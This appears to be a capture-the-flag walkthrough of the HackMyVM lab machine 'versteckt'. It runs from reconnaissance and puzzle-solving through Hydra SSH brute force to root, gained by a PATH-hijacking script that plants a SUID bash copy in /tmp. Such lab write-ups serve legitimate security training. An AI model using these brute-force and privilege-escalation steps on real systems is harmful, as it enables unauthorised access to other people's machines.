### 1. Initial Reconnaissance

I started by performing an Nmap scan on the target machine at `192.168.1.9`:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/versteckt]
└─$ nmap -sS -sV -sC -Pn --min-rate=1000 --max-retries=2 192.168.1.9 -p- -A
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 11:25 CDT
Nmap scan report for 192.168.1.9
Host is up (0.00038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.51 ((Debian))
|_http-title: Index of /
|_http-server-header: Apache/2.4.51 (Debian)
22334/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 7b:c0:c0:c9:62:10:2f:67:ac:8d:d9:e5:88:26:15:93 (RSA)
|   256 59:73:c6:ce:52:8e:11:47:ba:9b:b1:51:41:3c:fa:18 (ECDSA)
|_  256 b4:e1:e1:f1:95:bb:b5:23:7e:2e:80:27:4a:a1:c7:ee (ED25519)
```

The scan revealed two open ports:

- **Port 80**: HTTP (Apache httpd 2.4.51)
- **Port 22334**: SSH (OpenSSH 8.4p1) - Non-standard port


### 2. Web Enumeration

I used gobuster to enumerate directories on the web server:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/versteckt]
└─$ gobuster dir -u http://192.168.1.9 -w ../../wordlists/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.9
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ../../wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/icons                (Status: 301) [Size: 310] [--> http://192.168.1.9/icons/]
/index.html           (Status: 200) [Size: 559]
/robots.txt           (Status: 200) [Size: 64]
/server-status        (Status: 403) [Size: 276]
```

The scan found a `robots.txt` file. Let me examine its contents:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/versteckt]
└─$ curl http://192.168.1.9/robots.txt
Sierra Three Charlie Romeo Three Tango Zulu Zero November Three
```

### 3. Cryptographic Analysis

The robots.txt contained what appeared to be NATO phonetic alphabet. I decoded it by taking the first letter of each word and converting numbers from words to integers:

- **Sierra** → S
- **Three** → 3
- **Charlie** → C
- **Romeo** → R
- **Three** → 3
- **Tango** → T
- **Zulu** → Z
- **Zero** → 0
- **November** → N
- **Three** → 3


This gave me: `s3cr3tz0n3`

I also noticed the name "marcus" in the HTML source of the main page, suggesting a potential username.

### 4. Hidden Directory Discovery

I accessed the decoded path and found a hidden directory:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/versteckt]
└─$ curl http://192.168.1.9/s3cr3tz0n3/
<!DOCTYPE html>
<html lang="EN">
  <head>
  </head>
  <body>
       <center><pre>
        _                                                       
,´ `.                                               
______|___|______________________________________________      
|  /                       _..-´|                        
| /                  _..-´´_..-´|                  
______|/__________________|_..-´´_____|__________|\______     
,|                   |           |          | \         
/ |                   |           |          | ´     
___/__|___________________|___________|__________|_______  
/ ,´| `.                |      ,d88b|          |        
| .  |   \            __ |      88888|       __ |       _
|_|__|____|_________,d88b|______`Y88P'_____,d88b|_______ 
|  ` |    |         88888|                 88888|        
`.   |   /          `Y88P'                 `Y88P'       
___`._|_.´_______________________________________________      
|                                                      
, |                                                   
'.´        
</pre></center>
  </body>
</html>
```

I then enumerated this directory for additional files:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/versteckt]
└─$ gobuster dir -u http://192.168.1.9/s3cr3tz0n3/ -w ../../wordlists/common.txt -x txt,png,jpg,wav,mp3
===============================================================
[+] Extensions:              txt,png,jpg,wav,mp3
===============================================================
/audio.wav            (Status: 200) [Size: 179972]
/index.html           (Status: 200) [Size: 1128]
```

### 5. Steganography - Audio Analysis

I found an audio file (`audio.wav`) and analyzed it using spectrogram analysis. Hidden in the spectrogram was the string `/m0r3inf0`.

### 6. Further Directory Enumeration

I explored the newly discovered path:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/versteckt]
└─$ curl http://192.168.1.9/s3cr3tz0n3/m0r3inf0/
<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
    <title></title>
  </head>
  <body>
<center><pre>
Linux is a family of open-source Unix-like operating systems based on the Linux kernel,
an operating system kernel first released on September 17, 1991, by Linus Torvalds. Linux is typically packaged in a Linux distribution.
Distributions include the Linux kernel and supporting system software and libraries, many of which are provided by the GNU Project. Many Linux distributions use the word "Linux" in their name, but the Free Software Foundation uses the name "GNU/Linux" to emphasize the importance of GNU software, causing some controversy.
Popular Linux distributions include Debian, Fedora, and Ubuntu. Commercial distributions include Red Hat Enterprise Linux and SUSE Linux Enterprise Server. Desktop Linux distributions include a windowing system such as X11 or Wayland, and a desktop environment such as GNOME or KDE Plasma. Distributions intended for servers may omit graphics altogether, or include a solution stack such as LAMP. Because Linux is freely redistributable, anyone may create a distribution for any purpose.
Linux was originally developed for personal computers based on the Intel x86 architecture, but has since been ported to more platforms than any other operating system. Because of the dominance of the Linux-based Android on smartphones, Linux also has the largest installed base of all general-purpose operating systems. Although Linux is used by only around 2.3 percent of desktop computers, the Chromebook, which runs the Linux kernel-based Chrome OS, dominates the US K–12 education market and represents nearly 20 percent of sub-$300 notebook sales in the US. Linux is the leading operating system on servers (over 96.4% of the top 1 million web servers' operating systems are Linux), leads other big iron systems such as mainframe computers, and is the only OS used on TOP500 supercomputers (since November 2017, having gradually eliminated all competitors).
Linux also runs on embedded systems, i.e. devices whose operating system is typically built into the firmware and is highly tailored to the system. This includes routers, automation controls, smart home technology, televisions (Samsung and LG Smart TVs use Tizen and WebOS, respectively), automobiles (for example, Tesla, Audi, Mercedes-Benz, Hyundai, and Toyota all rely on Linux), digital video recorders, video game consoles, and smartwatches. The Falcon 9's and the Dragon 2's avionics use a customized version of Linux.
Linux is one of the most prominent examples of free and open-source software collaboration. The source code may be used, modified and distributed commercially or non-commercially by anyone under the terms of its respective licenses, such as the GNU General Public License.
</pre></center>
  </body>
</html>
```

### 7. Password Generation and Brute Force

I used `cewl` to generate a wordlist from the content and then used Hydra to brute force SSH credentials:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/versteckt]
└─$ cewl -m 4 http://192.168.1.9/s3cr3tz0n3/m0r3inf0/ | sort -u > pass.txt

┌──(zengla㉿kali)-[~/Desktop/hackmyvm/versteckt]
└─$ hydra -l marcus -P pass.txt 192.168.1.9 -s 22334 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-25 11:29:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 179 login tries (l:1/p:179), ~12 tries per task
[DATA] attacking ssh://192.168.1.9:22334/
[22334][ssh] host: 192.168.1.9   login: marcus   password: Falcon
```

Successfully found credentials: `marcus:Falcon`

### 8. Initial Access (`marcus`)

I logged in as `marcus` via SSH:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/versteckt]
└─$ ssh marcus@192.168.1.9 -p 22334
marcus@192.168.1.9's password: 
Linux versteckt 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64
# ... (login banner) ...
marcus@versteckt:~$
```

### 9. Database Exploration

I discovered MariaDB was running locally and accessed it using the same password:

```shellscript
marcus@versteckt:~$ mariadb -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 32
Server version: 10.5.12-MariaDB-0+deb11u1 Debian 11

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| versteckt          |
+--------------------+

MariaDB [(none)]> use versteckt;
Database changed
MariaDB [versteckt]> show tables;
+---------------------+
| Tables_in_versteckt |
+---------------------+
| secret              |
| secret2             |
| users               |
+---------------------+
```

I examined the tables and found encoded data:

```shellscript
MariaDB [versteckt]> select * from secret;
+--------+---------------+
| secret | contact       |
+--------+---------------+
| 1      | KkaFj6t5Iv14S |
| 2      | fOoj4bhIvCBS  |
| 3      | pIrj3bhIvOSs  |
# ... (truncated for brevity) ...
| 17     | 5HJ5fanYWal   |
+--------+---------------+

MariaDB [versteckt]> select * from secret2;
+--------+------------------+
| secret | contact          |
+--------+------------------+
| 1      | 5HJ5fanYWal      |
| 2      | dHJ5IGFnYWl      |
# ... (truncated for brevity) ...
| 17     | mYWZzYWZhZmFmYgo |
+--------+------------------+

MariaDB [versteckt]> select * from users;
+--------+-----------+
| iduser | username  |
+--------+-----------+
| 1      | Liam      |
| 2      | Olivia    |
# ... (truncated for brevity) ...
| 17     | Harper    |
+--------+-----------+
```

### 10. Data Decoding

I created a Python script to decode the base64 data by combining corresponding entries from `secret` and `secret2` tables:

```python
import base64

first = """| 1      | KkaFj6t5Iv14S |
| 2      | fOoj4bhIvCBS  |
| 3      | pIrj3bhIvOSs  |
| 4      | Fo27bhIvOfF   |
| 5      | LibJ7bhI11ba  |
| 6      | KnbJ1bhfaI9c  |
| 7      | Gkcvu12pbhcc  |
| 8      | gBacBu2pbhfi  |
| 9      | mHha6Fpbhkd   |
| 10     | 7jhZbFpbhw    |
| 11     | a3I0azR0MDR0  |
| 12     | SBhZ2Fpbgo    |
| 13     | bm9wIHRye     |
| 14     | NgAsI3GhhhY4b |
| 15     | pkA5I3GFhYWa  |
| 16     | dHJ5IGFnYWl   |
| 17     | 5HJ5fanYWal   |"""

first = first.split()
first = [user for user in first if len(user)> 2]

second = """| 1      | 5HJ5fanYWal      |
| 2      | dHJ5IGFnYWl      |
| 3      | pkA5I3GFhYWa     |
| 4      | NgAsI3GhhhY4b    |
| 5      | bm9wIHRye        |
| 6      | SBhZ2Fpbgo       |
| 7      | 7jhZbFpbhw       |
| 8      | mHha6Fpbhkd      |
| 9      | a3I0azR0Fj3b     |
| 10     | gBacBu2pbhfi     |
| 11     | aDNiM3NUcGw0YzMK |
| 12     | LibJ7bhI11bFBa   |
| 13     | 9udHJhc2XDsWEK   |
| 14     | dHJ5IGFnYWluIGB  |
| 15     | YWluIGhlaGVoZQoB |
| 16     | YXNjYWhidmhmYW   |
| 17     | mYWZzYWZhZmFmYgo |"""

second = second.split()
second = [user for user in second if len(user)> 2]

for i in range(17):
    combined = first[i]+second[i]
    try :
        print(base64.b64decode((combined).encode()))
    except :
        continue
```

Running the script revealed:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/versteckt]
└─$ python3 script.py
b'*F\x85\x8f\xaby"\xfdxK\x91\xc9\xe5\xf6\xa7af\xa5'
b'\xa4\x8a\xe3\xdd\xb8H\xbc\xe4\xac\xa6@9#q\x85\x85\x85\x9a'
b'\x16\x8d\xbbn\x12/9\xf1M\x80\x0b\x08\xdcha\x85\x8e\x1b'
b'kr4k4t04th3b3sTpl4c3\n'
b'H\x18Y\xd8Z[\x82\x82\xe2l\x9e\xdb\x84\x8dulPZ'
b'6\x00,#q\xa1\x86\x168m\xd1\xc9\xe4\x81\x85\x9d\x85\xa5\xb8\x81\x81'
b'\xa6@9#q\x85\x85\x85\x9aain hehehe\n\x01'
```

One of the decoded strings was clearly readable: `kr4k4t04th3b3sTpl4c3`

### 11. User Escalation to `benjamin`

I used this decoded password with the usernames from the database to brute force SSH access:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/versteckt]
└─$ hydra -L users.txt -p kr4k4t04th3b3sTpl4c3 192.168.1.9 -s 22334 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-25 11:33:10
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 17 login tries (l:17/p:1), ~2 tries per task
[DATA] attacking ssh://192.168.1.9:22334/
[22334][ssh] host: 192.168.1.9   login: benjamin   password: kr4k4t04th3b3sTpl4c3
```

Successfully found credentials: `benjamin:kr4k4t04th3b3sTpl4c3`

I logged in as `benjamin` and obtained the user flag:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/versteckt]
└─$ ssh benjamin@192.168.1.9 -p 22334
benjamin@192.168.1.9's password: 
Linux versteckt 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64
# ... (login banner) ...
$ python3 -c "import pty;pty.spawn('/bin/bash')"
benjamin@versteckt:~$ ls
user.txt
benjamin@versteckt:~$ cat user.txt
HMV{y0uR3gR34T}
```

The user flag is `HMV{y0uR3gR34T}`.

### 12. Privilege Escalation Analysis

I searched for SUID binaries and found an interesting custom binary:

```shellscript
benjamin@versteckt:~$ find / -perm -4000 -ls 2> /dev/null
# ... (standard SUID binaries) ...
   282625     20 -rwsrwx---   1 root     benjamin      16712 Nov 27  2021 /usr/bin/chsn
# ... (other binaries) ...
```

The `/usr/bin/chsn` binary was SUID root and owned by `benjamin` group with special permissions.

### 13. Binary Analysis

I copied the binary to my local machine and analyzed it with radare2:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/versteckt]
└─$ scp -P 22334 benjamin@192.168.1.9:/usr/bin/chsn ./
benjamin@192.168.1.9's password: 
chsn                                                                                                                                 100%   16KB   3.5MB/s   00:00

┌──(zengla㉿kali)-[~/Desktop/hackmyvm/versteckt]
└─$ r2 -d chsn
[0x7f37d20b9440]> aaa
[0x7f37d20b9440]> pdf @ main
            ; DATA XREF from entry0 @ 0x557ae9d5608d(r)
┌ 44: int main (int argc, char **argv, char **envp);
│           0x557ae9d56155      55             push rbp
│           0x557ae9d56156      4889e5         mov rbp, rsp
│           0x557ae9d56159      bf00000000     mov edi, 0
│           0x557ae9d5615e      e8edfeffff     call sym.imp.setuid     ; int setuid(int uid)
│           0x557ae9d56163      bf00000000     mov edi, 0
│           0x557ae9d56168      e8d3feffff     call sym.imp.setgid     ; int setgid(int gid)
│           0x557ae9d5616d      488d3d900e..   lea rdi, str.cat__tmp_proc.txt ; 0x557ae9d57004 ; "cat /tmp/proc.txt"
│           0x557ae9d56174      b800000000     mov eax, 0
│           0x557ae9d56179      e8b2feffff     call sym.imp.system     ; int system(const char *string)
│           0x557ae9d5617e      90             nop
│           0x557ae9d5617f      5d             pop rbp
└           0x557ae9d56180      c3             ret
```

The analysis revealed that the binary:

1. Sets UID and GID to 0 (root)
2. Executes the command `cat /tmp/proc.txt` using `system()`


### 14. PATH Hijacking Exploitation

Since the binary uses `system()` to call `cat` without an absolute path, I could exploit this through PATH hijacking:

```shellscript
benjamin@versteckt:~$ cat << 'EOF' > cat
#!/bin/bash 
cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
EOF

benjamin@versteckt:~$ chmod +x cat
benjamin@versteckt:~$ export PATH=/home/benjamin:$PATH
benjamin@versteckt:~$ /usr/bin/chsn
```

This created a malicious `cat` script that copies `/bin/bash` to `/tmp/rootbash` with SUID permissions.

### 15. Root Access

After running the SUID binary, I checked for the created rootbash:

```shellscript
benjamin@versteckt:~$ ls -la /tmp
total 1248
drwxrwxrwt 10 root root    4096 Jul 25 10:39 .
drwxr-xr-x 18 root root    4096 Nov 22  2021 ..
# ... (other files) ...
-rwsr-xr-x  1 root root 1234376 Jul 25 10:39 rootbash
# ... (other files) ...

benjamin@versteckt:~$ /tmp/rootbash -p
rootbash-5.1# id
uid=1011(benjamin) gid=1011(benjamin) euid=0(root) groups=1011(benjamin)
```

I successfully gained root privileges! Finally, I retrieved the root flag:

```shellscript
rootbash-5.1# cd /root
rootbash-5.1# ls
root.txt
rootbash-5.1# export PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
rootbash-5.1# cat root.txt 
HMV{y0uR3D3fin1t3lytH3b3S7}
```

The root flag is `HMV{y0uR3D3fin1t3lytH3b3S7}`.

### Summary of Attack Path:

1. **Reconnaissance:** Identified target with HTTP (80) and SSH (22334) services.
2. **Web Enumeration:** Found `robots.txt` with cryptic NATO phonetic alphabet message.
3. **Cryptographic Analysis:** Decoded message to reveal hidden directory `/s3cr3tz0n3/`.
4. **Steganography:** Analyzed audio file spectrogram to discover `/m0r3inf0/` path.
5. **Password Generation:** Used `cewl` to create wordlist from Linux information page.
6. **Credential Discovery:** Brute forced SSH to find `marcus:Falcon`.
7. **Database Access:** Accessed MariaDB with same credentials and found encoded data.
8. **Data Decoding:** Created Python script to decode base64 data, revealing `kr4k4t04th3b3sTpl4c3`.
9. **User Escalation:** Used decoded password to access `benjamin` account and obtained user flag.
10. **Binary Analysis:** Found custom SUID binary `/usr/bin/chsn` that executes `cat /tmp/proc.txt`.
11. **PATH Hijacking:** Created malicious `cat` script and manipulated PATH to exploit SUID binary.
12. **Root Access:** Successfully gained root privileges and retrieved root flag.
